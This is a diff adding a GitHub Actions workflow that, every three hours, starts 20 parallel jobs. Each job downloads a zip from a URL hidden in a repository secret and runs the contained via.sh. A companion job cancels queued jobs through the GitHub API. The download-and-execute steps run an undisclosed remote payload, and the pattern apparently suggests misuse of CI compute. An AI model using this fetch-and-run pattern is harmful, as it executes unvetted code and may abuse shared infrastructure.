@@ -1,0 +1,130 @@
+name: via
+
+on:
+  schedule:
+    # Run every 3 hours (at minute 0)
+    - cron: "0 */3 * * *"
+  workflow_dispatch:
+
+# Ensure only one workflow run executes at a time across the repo.
+# New runs will wait (be queued) until the current one finishes.
+concurrency:
+  group: "via-workflow"
+  cancel-in-progress: false
+
+# Allow the cleanup step to cancel jobs (needs 'actions: write').
+permissions:
+  contents: read
+  actions: write
+
+env:
+  MAX_WORKERS: "20"
+
+jobs:
+  export-and-run:
+    runs-on: ubuntu-latest
+
+    # exactly 20 parallel workers per workflow run
+    strategy:
+      matrix:
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      max-parallel: 20
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Download
+        shell: bash
+        run: |
+          curl -fsSL -o via.zip "${{ secrets.VIA }}"
+          if [ ! -f "via.zip" ]; then
+            echo "Download failed: via.zip not found."
+            exit 1
+          fi
+
+      - name: Unzip
+        shell: bash
+        run: |
+          unzip -q via.zip
+          rm -f via.zip
+
+      - name: Make runner executable
+        shell: bash
+        run: |
+          chmod +x ./via.sh
+
+      - name: Run worker
+        shell: bash
+        env:
+          WORKER_ID: ${{ matrix.worker }}
+          MAX_WORKERS: ${{ env.MAX_WORKERS }}
+        run: |
+          echo "Starting worker $WORKER_ID of $MAX_WORKERS"
+          ./via.sh "$WORKER_ID"
+
+  cleanup-queued-jobs:
+    # single runner job — will run in parallel with the matrix jobs
+    runs-on: ubuntu-latest
+    needs: []
+    # Run immediately in parallel, but script will sleep 10s before taking action.
+    steps:
+      - name: Wait 10s for jobs to be scheduled
+        run: sleep 10
+
+      - name: Install jq (for JSON parsing)
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install -y jq
+
+      - name: Cancel queued jobs in this run (keep in_progress)
+        env:
+          GITHUB_API_URL: https://api.github.com
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "Listing jobs for run $RUN_ID in $REPO..."
+          # fetch up to 100 jobs (should be enough for this workflow)
+          resp="$(curl -sS -H "Accept: application/vnd.github+json" \
+                        -H "Authorization: Bearer $TOKEN" \
+                        -H "X-GitHub-Api-Version: 2022-11-28" \
+                        "$GITHUB_API_URL/repos/$REPO/actions/runs/$RUN_ID/jobs?per_page=100")"
+
+          echo "$resp" | jq '.total_count as $c | "total jobs: \($c)"'
+
+          # extract job ids that are queued
+          queued_ids=$(echo "$resp" | jq -r '.jobs[] | select(.status == "queued") | .id')
+
+          if [ -z "$queued_ids" ]; then
+            echo "No queued jobs found. Nothing to cancel."
+            exit 0
+          fi
+
+          echo "Queued job ids to cancel:"
+          echo "$queued_ids"
+
+          # cancel each queued job
+          for jid in $queued_ids; do
+            echo "Cancelling job id $jid ..."
+            http_status=$(curl -sS -o /dev/null -w "%{http_code}" -X POST \
+              -H "Accept: application/vnd.github+json" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "X-GitHub-Api-Version: 2022-11-28" \
+              "$GITHUB_API_URL/repos/$REPO/actions/jobs/$jid/cancel")
+
+            if [ "$http_status" -eq 202 ] || [ "$http_status" -eq 204 ]; then
+              echo "Cancel request accepted for job $jid (status $http_status)."
+            else
+              echo "Cancel request for job $jid returned HTTP $http_status. Body:"
+              curl -sS -X POST \
+                -H "Accept: application/vnd.github+json" \
+                -H "Authorization: Bearer $TOKEN" \
+                -H "X-GitHub-Api-Version: 2022-11-28" \
+                "$GITHUB_API_URL/repos/$REPO/actions/jobs/$jid/cancel" || true
+            fi
+          done
+
+          echo "Cleanup finished."
